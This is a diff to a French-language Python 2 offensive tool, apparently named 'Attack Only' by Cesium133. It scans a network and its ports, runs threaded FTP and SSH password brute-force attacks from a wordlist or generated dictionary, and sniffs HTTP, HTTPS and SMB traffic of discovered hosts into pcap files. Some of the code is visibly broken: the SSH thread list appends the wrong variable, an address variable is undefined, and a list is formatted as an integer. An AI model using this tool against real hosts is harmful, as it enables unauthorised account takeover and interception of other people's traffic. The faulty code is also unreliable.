@@ -114,7 +114,7 @@ def ssh_conn(log, addr, passwd):
 		flag = 1
 	except:
 		pass
-
+	
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
 		raise ValueError("\033[91m[-]\033[0m Valeur du masque illégale.", hex(arg))
@@ -307,7 +307,7 @@ def pcap(pc, protocol):
 			pass
 
 def get_args():
-	args = ArgumentParser(version='1.5',description='Attack Only, made by Cesium133.')
+	args = ArgumentParser(version='1.5',description='Discovery and attack only, made by Cesium133.')
 	args.add_argument('-b','--bruteforce',
 		action='store_true',
 		default=False,
@@ -328,6 +328,7 @@ def get_args():
 	args.add_argument('-m','--mode',
 		action='store',
 		nargs=1,
+		default='alpha',
 		help='Alphabet de bruteforce [alpha|digits|big].')
 	args.add_argument('-l','--longueur',
 		action='store',
@@ -342,7 +343,7 @@ def get_args():
 		action='store',
 		nargs=1,
 		default='http',
-		help='Protocol à analyser.')
+		help='Protocole à analyser.')
 	return args.parse_args()
 
 
@@ -366,77 +367,94 @@ if __name__ == '__main__':
 	ips = network_scan(ip)
 	port_scan(ip)
 	
-	if args.wordlist is not None:
-		try:
-			print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
-			with open(args.wordlist[0],'rb') as wl:
-				dic = wl.read().replace('\r','').split('\n')
-		except:
-			print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
-			sys.exit(-1)
-	elif args.mode is not None:
-		print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
-		print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
-		print "\033[92m[*]\033[0m  Longueur des lignes:", args.longueur[0]
-		print "\033[92m[*]\033[0m  Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
-		dic = generate(args.mode[0], args.longueur[0])
-	else:
-		online = []
-		print '\033[91m[-]\033[0m Online est vide après le scan de port.\n'
+	if args.bruteforce:
+		if args.wordlist is not None:
+			try:
+				print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
+				with open(args.wordlist[0],'rb') as wl:
+					dic = wl.read().replace('\r','').split('\n')
+			except:
+				print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
+				sys.exit(-1)
+		elif args.mode is not None:
+			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
+			print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
+			print "\033[92m[*]\033[0m  Longueur des lignes:", args.longueur[0]
+			print "\033[92m[*]\033[0m  Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
+			dic = generate(args.mode[0], args.longueur[0])
+		else:
+			online = []
+			print '\033[91m[-]\033[0m Online est vide après le scan de port.\n'
 
 	if online is not None:
-		if args.bruteforce:
-			idx = 0
-			for host in online:
-				if 21 in online[host]:
-					print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
-					try:
-						threads = []
-						for item in dic:
-							t = Thread(target=detonate,args=(user,ip,item,))
-							threads.append(t)
-							t.start()
-							idx += 1
-							if ftop == 1:
-								ftop = 0
-								break
-						for thr in threads:
-			 				thr.join()
-					except KeyboardInterrupt:
-						print '\n\n[*] Nbr d\'essais '+ str(idx)
-						idx = 0
-					except Exception as e:
-						logger.error("\033[91m[-]\033[0m %s", e.strerror)
-
-			for host in online:
-				if 22 in online[host]:
-					print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
-					try:
-						threads = []
-						for psswd in dic:
-							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
-							threads.append(t)
-							conn.start()
-							idx += 1
-							if flag == 1:
-								flag = 0
-								break
-						for thr in threads:
-							thr.join()
-					except KeyboardInterrupt:
-						print '\n\n[*] Nbr d\'essais '+ str(idx)
-						idx = 0
-					except Exception as e:
-						logger.error("\033[91m[-]\033[0m %s", e.strerror)
-			sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
-		else:
-			for host in online:
-				if 80 in online[host]:
-					try:
-						sniffed = sniff(filter="tcp and port 80 and host " + host, count=100)
-						wrpcap(host + '-filtered.pcap', sniffed, append=True)
-					except KeyboardInterrupt:
-						wrpcap('filtered.pcap', sniffed, append=True)
-			sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
+		idx = 0
+		for host in online:
+# FTP ----------------------------------------------------------------------------------------------------------
+			if 21 in online[host]:
+				print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
+				try:
+					threads = []
+					for item in dic:
+						t = Thread(target=detonate,args=(user,ip,item,))
+						threads.append(t)
+						t.start()
+						idx += 1
+						if ftop == 1:
+							ftop = 0
+							break
+					for thr in threads:
+						thr.join()
+				except KeyboardInterrupt:
+					print '\n\n[*] Nbr d\'essais '+ str(idx)
+					idx = 0
+				except Exception as e:
+					logger.error("\033[91m[-]\033[0m %s", e.strerror)
+# SSH ----------------------------------------------------------------------------------------------------------
+			if 22 in online[host]:
+				print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
+				try:
+					threads = []
+					for psswd in dic:
+						conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
+						threads.append(t)
+						conn.start()
+						idx += 1
+						if flag == 1:
+							flag = 0
+							break
+					for thr in threads:
+						thr.join()
+				except KeyboardInterrupt:
+					print '\n\n[*] Nbr d\'essais '+ str(idx)
+					idx = 0
+				except Exception as e:
+					logger.error("\033[91m[-]\033[0m %s", e.strerror)
+# HTTP ---------------------------------------------------------------------------------------------------------
+			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
+				port_idx = [i for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
+				print "\033[94m[+]\033[0m Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
+				try:
+					sniffed = sniff(filter="tcp and port " +
+							str(online[host][port_idx]) + " and host " + host, count=100)
+					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+				except KeyboardInterrupt:
+					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+# HTTPS --------------------------------------------------------------------------------------------------------
+			if 443 in online[host]:
+				print "\033[94m[+]\033[0m Cible avec HTTPS ouvert : %s." % host
+				try:
+					sniffed = sniff(filter="tcp and port 443 and host " + host, count=100)
+					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
+				except KeyboardInterrupt:
+					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
+# SMB ----------------------------------------------------------------------------------------------------------
+			if 445 in online[host]:
+				print "\033[94m[+]\033[0m Cible avec SMB ouvert : %s." % host
+				try:
+					sniffed = sniff(filter="tcp and port 445 and host " + host, count=100)
+					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
+				except KeyboardInterrupt:
+					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
+		sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
 	else:
 		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
